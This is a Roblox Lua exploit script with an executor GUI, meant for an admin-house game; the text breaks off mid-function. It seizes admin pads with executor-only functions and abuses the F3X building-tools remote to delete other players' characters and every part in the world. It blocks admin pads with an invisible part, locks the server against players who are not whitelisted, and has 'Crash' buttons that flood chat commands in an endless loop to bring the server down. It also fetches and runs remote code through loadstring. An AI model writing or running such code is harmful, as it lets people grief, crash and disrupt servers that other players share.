if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/deeeity/mercury-lib/master/src.lua"))()

local Window = Lib:Create{Name = "VELO", Size = UDim2.fromOffset(600, 400), Theme = Lib.Themes.Dark,  Link = "https://github.com/quivings/"}

local ChatStuff = game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar

local Backpack = game.Players.LocalPlayer:WaitForChild("Backpack") or game.Players.LocalPlayer.Backpack:Wait()

local AD = true
local ServerlockV = false
local Perm = true
local OnlyMeAdmin = false
local AntiPartCrash = false
local AntiVampCrash = false
local stop = false
local AntiDeath = false
local hasadmin = false
local AntiAbuse = false

local Gen = Window:Tab{
	Name = "General",
	Icon = "rbxassetid://170940873",
}

local Buttons = Window:Tab{
	Name = "Buttons",
	Icon = "rbxassetid://9511537775",
}

Window:Credit{
	Name = "quiving",
	Description = "Script Creator (NOT THE UI)",
	V3rm = "https://v3rmillion.net/member.php?action=profile&uid=601537",
	Discord = "quiving#9135"
}

local Blacklist = {}

--local Adonis


local prefix = "."

local SecureParts

for i,v in pairs(game:GetService("Workspace"):GetChildren()) do
    if v.Name == "SecureParts" and v:FindFirstChild("ResetPads") then
        SecureParts = v
    end
end

--[[for i,v in pairs(game:GetService("JointsService"):GetChildren()) do
    if v:IsA("RemoteEvent") then
        Adonis = v
    end
end]]

local whitelist = {}

local Regen = SecureParts.ResetPads

local F3X_API
local F3X_ServerEndpoint

local Pads = SecureParts.AdminPads:GetChildren()

local PermPad = Pads[math.random(1, #Pads)]

local function addcmd(cmdname, alias, func)
    game.Players.LocalPlayer.Chatted:Connect(function(msg)
        local newmsg = string.lower(msg)
        local args = newmsg:split(" ")
        if args[1] == prefix .. cmdname then 
            if args[2] == nil then
                func()
            else	
                func(newmsg:gsub(prefix .. cmdname .. " ", ""))
            end
        end
        if alias ~= nil then
            if args[1] == prefix .. alias then
                if args[2] == nil then
                    func()
                else	
                    func(newmsg:gsub(prefix .. alias .. " ", ""))
                end
            end
        end
    end)
end



local function chat(msg)
    ChatStuff:SetTextFromInput(msg)
    game.Players:Chat(msg)
    ChatStuff:SetTextFromInput("")
end

local FolderAntiParts = Instance.new("Folder", game.ReplicatedStorage)

FolderAntiParts.Name = "AntiPartCrash"

if isPrivate == "True" then
    Perm = false
end


local function nilmap()
    workspace.Gravity = 0
    for _,v in pairs(workspace:GetDescendants()) do
        if v:IsA("Part") then
            v.CanCollide = false
        end
    end
end

local function unnilmap()
    for _,v in pairs(workspace:GetDescendants()) do
        if v:IsA("Part") then
            v.CanCollide = true
        end
    end
    workspace.Gravity = 198.2
end

local function regen(s)
    nilmap()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Regen.CFrame
    wait(.25)
    fireclickdetector(Regen.ClickDetector)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = s
    unnilmap()
end

local function touchpad(p,s)
    nilmap()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p.CFrame
    task.wait(.25)
    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, p, 0)
    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, p, 1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = s
    unnilmap()
end

regen(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
touchpad(PermPad.Head, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)

game.Players.LocalPlayer.ChildAdded:Connect(function(v)
    if v.Name == "Backpack" then
        v.ChildAdded:Connect(function(f)
            if f.Name == "Folder" and hasadmin then
                F3X_API = f:WaitForChild("SyncAPI")
                F3X_ServerEndpoint = F3X_API:WaitForChild("ServerEndpoint")
            end
        end)
    end
end)


game.Players.LocalPlayer.Backpack.ChildAdded:Connect(function(f)
    if f.Name == "Folder" and hasadmin then
        F3X_API = f:WaitForChild("SyncAPI")
        F3X_ServerEndpoint = F3X_API:WaitForChild("ServerEndpoint")
    end
end)



task.spawn(function()
    while true do
        task.wait()
        if AntiPartCrash then
            for _,v in pairs(workspace:GetChildren()) do
                if v.Name ~= game.Players.LocalPlayer.Name .. "_ADONISJAIL" and v.Name ~= "Kaderth" and v.Name ~= "SpawnLocation" and not game.Players:FindFirstChild(v.Name) and v.Name ~= "SecureParts" and v.Name ~= game.Players.LocalPlayer.Name and v.Name ~= "Terrain" and v.Name ~= "Camera" and v.Name ~= "VampireVanquisher" then
                    v.Parent = game.ReplicatedStorage.AntiPartCrash
                end
            end
        end
    end
end)

pcall(function()
    local torso = game.Players.LocalPlayer.Character:WaitForChild('Torso') or game.Players.LocalPlayer.Character:WaitForChild('UpperTorso')
    torso:GetPropertyChangedSignal('Anchored'):Connect(function(t)
        if torso.Anchored and AntiAbuse then
            chat(":thaw")
        end
    end)
end)


game.Players.LocalPlayer.CharacterAdded:Connect(function()
    local torso = game.Players.LocalPlayer.Character:WaitForChild('Torso') or game.Players.LocalPlayer.Character:WaitForChild('UpperTorso')
    torso:GetPropertyChangedSignal('Anchored'):Connect(function(t)
        if torso.Anchored and AntiAbuse then
            chat(":thaw")
        end
    end)

    F3X_ServerEndpoint = nil
    chat(":removetools")
    if game.Players.LocalPlayer:FindFirstChild("Backpack") then
        for i,v in pairs(game.Players.LocalPlayer:FindFirstChild("Backpack"):GetChildren()) do
            v:Destroy()
        end
        chat(":removetools")
    end
end)

task.spawn(function()
    while true do
        task.wait(.5)
        if AntiVampCrash then
            for _,v in pairs(workspace:GetDescendants()) do
                if v.Name == "VampireVanquisher" and v.Parent:IsA("Model") then
                    chat(":removetools " .. v.Parent.Name)
                end
            end
            for _,v in pairs(game.Players:GetPlayers()) do
                if v:FindFirstChild("Backpack"):FindFirstChild("VampireVanquisher") then
                    chat(":removetools " .. v.Name)
                end
            end
        end
    end
end)

task.spawn(function()
    while true do
        game.RunService.Heartbeat:Wait()
        if Perm then
            if PermPad.Name ~= game.Players.LocalPlayer.Name .. "'s admin" and not SecureParts.AdminPads:FindFirstChild(game.Players.LocalPlayer.Name .. "'s admin") then
                hasadmin = true
            elseif PermPad.Name == game.Players.LocalPlayer.Name .. "'s admin" or SecureParts.AdminPads:FindFirstChild(game.Players.LocalPlayer.Name .. "'s admin") then
                hasadmin = true
            end
        end
    end
end)



task.spawn(function()
    while true do
        task.wait(.25)
        if AntiAbuse then
            if game.Workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "_ADONISJAIL") then
                chat(":free")
            end
            for i,v in pairs(workspace:GetDescendants()) do
                if v.Name == "Adonis_Ice" and v.Parent.Name == game.Players.LocalPlayer.Name then
                    chat(":thaw")
                end
            end
        end
    end
end)

task.spawn(function()
    while true do
        task.wait(.25)
        if AntiAbuse then
            if game.Lighting:FindFirstChild(game.Players.LocalPlayer.Name) then
                chat(":unpunish me")
            end
        end
    end
end)

task.spawn(function()
    while true do
        wait(.25)
        if workspace:FindFirstChild(game.Players.LocalPlayer.Name) and workspace:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("HumanoidRootPart") and AntiDeath then
            local hum = workspace:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChildOfClass("Humanoid")
            if hum.Health == 0 then
                chat(":reset")
                task.wait(.5)
                chat(":god")
            end
        else
            repeat task.wait() until workspace:FindFirstChild(game.Players.LocalPlayer.Name) and workspace:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("HumanoidRootPart")
        end
    end
end)

game.Lighting.ChildAdded:Connect(function(c)
    if c.Name == game.Players.LocalPlayer.Name and AntiAbuse then
        chat(":unpunish me")
    end
end)

task.spawn(function()
    while true do
        task.wait(.5)
        if game.Players.LocalPlayer:FindFirstChild("Backpack") and not game.Players.LocalPlayer.Backpack:FindFirstChild("Building Tools") and not game.Players.LocalPlayer.Character:FindFirstChild("Building Tools") or not F3X_ServerEndpoint then
            chat(":f3x me")
        end
    end
end)

task.spawn(function()
    while true do
        task.wait()
        for i,v in pairs(workspace:GetChildren()) do
            if game.Players:FindFirstChild(v.Name) and v.Name ~= game.Players.LocalPlayer.Name and table.find(Blacklist, v.Name) then
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Folder") then
                    local thread1 = coroutine.create(function()
                        local args = {
                            [1] = "Remove",
                            [2] = {
                                [1] = game.Players:FindFirstChild(v.Name).Character
                            }
                        }
                        F3X_ServerEndpoint:InvokeServer(unpack(args))
                    end)
                    coroutine.resume(thread1)
                end
            end
        end
        for i,v in pairs(Blacklist) do
            if SecureParts.AdminPads:FindFirstChild(v .. "'s admin") then
                regen(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
            end
        end
    end
end)

task.spawn(function()
    while true do
        task.wait(.5)
        if ServerlockV then
            for i,v in pairs(workspace:GetChildren()) do
                if v.Name ~= game.Players.LocalPlayer.Name and game.Players:FindFirstChild(v.Name) and not table.find(whitelist, v.Name) then
                    if game.Players.LocalPlayer:FindFirstChild("Backpack") and game.Players.LocalPlayer.Backpack:FindFirstChild("Folder") then
                        local thread = coroutine.create(function()
                            local args = {
                                [1] = "Remove",
                                [2] = {
                                    [1] = game.Players:FindFirstChild(v.Name).Character
                                }
                            }
                            F3X_ServerEndpoint:InvokeServer(unpack(args))
                        end)
                        coroutine.resume(thread)
                    end
                end
            end
        end
    end  
end)

local function blockadmin()
    local ca
    ca = workspace.ChildAdded:Connect(function(p)
        if p:IsA("Part") then
            Instance.new("BoolValue", p)
    
            local args2 = {
                [1] = "SyncResize",
                [2] = {
                    [1] = {
                        ["Part"] = p,
                        ["CFrame"] = CFrame.new(Vector3.new(1.9864888191223145, 26.299943923950195, 106.17794799804688), Vector3.new(-0, -0, -1)),
                        ["Size"] = Vector3.new(50, 4, 7)
                    }
                }
            }
    
            F3X_ServerEndpoint:InvokeServer(unpack(args2))

            task.wait(.2)
    
            local args3= {
                [1] = "SyncMaterial",
                [2] = {
                    [1] = {
                        ["Part"] = p,
                        ["Transparency"] = 1
                    }
                }
            }
    
            F3X_ServerEndpoint:InvokeServer(unpack(args3))
            task.wait(.2)
            local args1 = {
                [1] = "SetLocked",
                [2] = {
                    p
                },
                [3] = true
            }
        
            F3X_ServerEndpoint:InvokeServer(unpack(args1))
            task.wait(.2)
            local args24 = {
                [1] = "SetParent",
                [2] = {
                    [1] = p
                },
                [3] = workspace.Terrain
            }
    
            F3X_ServerEndpoint:InvokeServer(unpack(args24))
            task.wait(.2)
    
            ca:Disconnect()
        end

        task.wait(.5)

        local args0 = {
            [1] = "CreatePart",
            [2] = "Normal",
            [3] = CFrame.new(Vector3.new(-2.0135111808776855, 24.799943923950195, 103.67794799804688), Vector3.new(-0, -0, -1)),
            [4] = workspace
        }
        
        F3X_ServerEndpoint:InvokeServer(unpack(args0))
    end)


end


local function delparts()
    if AntiPartCrash then
        for _,v in pairs(game.ReplicatedStorage.AntiPartCrash:GetChildren()) do
            if not game.Players:FindFirstChild(v.Name) then
                local thread = coroutine.create(function()
                    local args = {
                        [1] = "Remove",
                        [2] = {
                            [1] = v
                        }
                    }
                    F3X_ServerEndpoint:InvokeServer(unpack(args))
                end)
                coroutine.resume(thread)
            end
        end
    else
        for _,v in pairs(workspace:GetChildren()) do
            if not game.Players:FindFirstChild(v.Name) then
                local thread = coroutine.create(function()
                    local args = {
                        [1] = "Remove",
                        [2] = {
                            [1] = v
                        }
                    }
                    F3X_ServerEndpoint:InvokeServer(unpack(args))
                end)
                coroutine.resume(thread)
            end
        end
    end
    chat(":sm Builds have been cleared successfully.")
end

Gen:Toggle{
    Name = "Serverlock",
    StartingState = false,
    Callback = function(v)
        if v then
            chat(":f3x |:sm [ CMD-AH ] This server is locked.| :setmsg [ CMD-AH ] This server is locked. \t\t Whitelisted users: " .. tostring(#whitelist))
            ServerlockV = true
        else
            chat(":f3x |:sm [ CMD-AH ] This server is unlocked.|:unpunish all|:setmsg [ CMD-AH ] This server is unlocked. \t\t Whitelisted users: " .. tostring(#whitelist))
            ServerlockV = false
        end
    end
}

Gen:Toggle{
    Name = "Advertise CMD-AH modded",
    StartingState = false,
    Callback = function(v)
        if v then
            chat(":runc cmd-ah ad")
        else
           chat(":stopc|:stopc|:stopc|:stopc|:stopc|:stopc|:stopc|:stopc|:stopc|:stopc|:stopc|:stopc|:stopc|:stopc|:stopc|:stopc|:stopc|:stopc|:stopc|:stopc|:stopc|:stopc|:stopc|:stopc|")
        end
    end
}

Gen:Toggle{
    Name = "Serverlock Reason",
    StartingState = false,
    Callback = function(v)
        if v then
            chat(":f3x |:sm [ CMD-AH ] This server is locked due someone is abusing.| :setmsg [ CMD-AH ] This server is locked. \t\t Whitelisted users: " .. tostring(#whitelist))
            ServerlockV = true
        else
            chat(":f3x |:sm [ CMD-AH ] This server is unlocked.|:unpunish all|:setmsg [ CMD-AH ] This server is unlocked. \t\t Whitelisted users: " .. tostring(#whitelist))
            ServerlockV = false
        end
    end
}

Gen:Toggle{
    Name = "AntiAbuse",
    StartingState = false,
    Callback = function(v)
        if v then
            AntiAbuse = true
            Window:Notification{
                Title = "CMD",
                Text = "AntiAbuse is on!",
                Time = 3,
                callback = function()
                end
            }
        else
            AntiAbuse = false
            Window:Notification{
                Title  = "CMD",
                Text = "AntiAbuse is off!",
                Time = 3,
                callback = function()
                end
            }
        end
    end
}

Gen:Toggle{
    Name = "AntiDeath",
    StartingState = false,
    Callback = function(v)
        if v then
            AntiDeath = true
            Window:Notification{
                Title = "CMD",
                Text = "AntiDeath is on!",
                Time = 3,
                callback = function()
                end
            }
        else
            AntiDeath = false
            Window:Notification{
                Title = "CMD",
                text = "AntiDeath is off!",
                Time = 3,
                callback = function()
                end
            }
        end
    end
}

Gen:Toggle{
    Name = "Anti Part Crash",
    StartingState = false,
    Callback = function(v)
        if v then
            AntiPartCrash = true
            Window:Notification{
                Title = "CMD",
                Text = "Anti Part Crash is on!",
                Time = 3,
                callback = function()
                end
            }
        else
            AntiPartCrash = false
            for i,v in pairs(game.ReplicatedStorage.AntiPartCrash:GetChildren()) do
                v.Parent = workspace
            end
            Window:Notification{
                Title = "CMD",
                Text = "Anti Part Crash is off!",
                Time = 3,
                callback = function()
                end
            }
        end
    end
}


Gen:Toggle{
    Name = "Anti Vamp Crash [RISKY - RATELIMITING]",
    StartingState = false,
    Callback = function(v)
        if v then
            AntiVampCrash = true
            Window:Notification{
                Title = "CMD",
                Text = "Anti Vamp Crash is on!",
                Time = 3,
                callback = function()
                end
            }
        else
            AntiVampCrash = false
            Window:Notification{
                Title = "CMD",
                Text = "Anti Vamp Crash is off!",
                Time = 3,
                callback = function()
                end
            }
        end
    end
}


Buttons:Button{
	Name = "Crash",
    desc = "Crashes the server",
	Callback = function()
        chat(":tm 2848592 Client has initiated disconnect \n\n [ CMD-AH ] \n\n\n\n Join the server: VnWVvAMCBC")
      	for i = 1, 6 do
            chat(":gear me 94794847")
        end
        task.wait(2)
        for _,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            if v.Name == "VampireVanquisher" then
                v.Parent = game.Players.LocalPlayer.Character
            end
        end
        task.wait()
        for _,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v.Name == "VampireVanquisher" then
                v.Parent = workspace
            end
        end
  	end    
}

Buttons:Button{
	Name = "Block Admin",
    desc = "Blocks admin pads with an invincible and invisible part",
	Callback = function()
        chat(":pm me [ CMD-AH ] \n\n Blocking admin...")
      	blockadmin()
  	end    
}

Buttons:Button{
	Name = "Reset Admin",
    desc = "JUST RESET",
	Callback = function()
        originallocation = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
wait(.1)
game:getService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =  CFrame.new(22, 28, 100)
wait(.1)
    fireclickdetector(game.Workspace.SecureParts.ResetPads.ClickDetector)
wait(.1)
game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(originallocation)
end
}

Buttons:Button{
	Name = "Reduce Lag",
    desc = "Deletes all the parts in workspace (serversided)",
	Callback = function()
        chat(":runc Reduce lag|:sm [ CMD-AH ] Laggable or Crashable Build Found! Delete all build in 15 sec.|:cd 15")
wait(17)
      	delparts()
        chat(":music|:fix")
  	end    
}

Buttons:Button{
	Name = "Delete all part",
    desc = "Deletes all the parts in workspace (serversided)",
	Callback = function()
      	delparts()
  	end    
}

Buttons:Button{
	Name = "Crash",
    desc = "",
	Callback = function()
      	chat(":skydive me 999000|:freeze|:music 5410083912|:sm リラックス~|:ambient 0 204 255|:oambient 0 204 255|:time 0")
	wait(2)
while wait() do
	chat(":bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf|:bot me inf")
	chat(":clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|")
	chat(":hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|")
		chat(":clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|")
	chat(":hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|")
	chat(":clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|")
	chat(":hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|")
		chat(":clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|")
	chat(":hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|")
	chat(":clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|")
	chat(":hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|")
		chat(":clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|")
	chat(":hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|")
	chat(":clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|")
	chat(":hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|")
		chat(":clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|")
	chat(":hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|")
	chat(":clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|")
	chat(":hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|")
		chat(":clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|:clone|")
	chat(":hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|:hatpets me inf|")
  	end    
	  end
}

addcmd("regen", "reg", function()
    regen(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
end)

addcmd("house", "hs", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-0,28,82) 
end)

addcmd("iy", nil, function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

addcmd("rejoin", "rj", function()
    game:GetService('TeleportService'):Teleport(game.PlaceId)
end)

addcmd("novoid", nil, function()
    workspace.FallenPartsDestroyHeight = 0/0
end)

addcmd("zawarudo", nil, function()
    chat(":runc timestop")
end)

addcmd("a", nil, function()
      AntiPartCrash = true
Window:Notification{
                Title = "CMD",
                Text = v.Name .. " AntiPartCrash Enabled",
                Time = 3,
                callback = function()
                end
            }
end)

addcmd("na", nil, function()
      AntiPartCrash = false
AntiPartCrash = false
            for i,v in pairs(game.ReplicatedStorage.AntiPartCrash:GetChildren()) do
                v.Parent = workspace
end
end)

addcmd("serverlock", "sl", function(plr)
    for _,v in pairs(game.Players:GetPlayers()) do
        if not table.find(whitelist, v.Name) and string.sub(string.lower(v.Name), 1, #plr) == plr then
    chat(":sm [ CMD-AH ] This server is locked due " .. v.Name .. " is abusing.")
    chat(":setmsg [ CMD-AH ] This server is locked.")
    ServerlockV = true     
            Window:Notification{
                Title = "CMD",
                Text = v.Name .. " locked!",
                Time = 3,
                callback = function()
                end
            }
        end
    end
end)

addcmd("unserverlock", "unsl", function()
    chat(":sm [ CMD-AH ] This server is unlocked.|:setmsg [ CMD-AH ]|:unpunish others")
    ServerlockV = false     
end)

addcmd("stab", nil, function()
    chat(":unff radius-7 | :music 3097238025 true 1 inf | :animation me 45913583 | :cut radius-7 | :cut radius-7 | :cut radius-7 | :unrope me | :charaudio radius-7 147758746 | !wait 1 | :stopanimation | :stun radius-7 | :removehats radius-7")
end)

addcmd("grab", nil, function()
    chat(":gear me knife|:music 6400852636 true|:animation me 60816404 | !wait 0.4 | :r6 radius-7 | :stopanimation | :animation me 158994295 | :rope radius-8 me 1 |:Volume inf|:SIZE radius-7 .85")
end)

addcmd("warn", nil, function(plr)
 for _,v in pairs(game.Players:GetPlayers()) do
        if not table.find(Blacklist, v.Name) and string.sub(string.lower(v.Name), 1, #plr) == plr then
    chat(":textw " .. v.Name .. " WARN:\nYOU WERE WARNING BY SYSTEM\nTHIS IS YOUR FIRST CHANCE, IF YOU REACH 3 WARN, YOU WILL GET KICKED.")
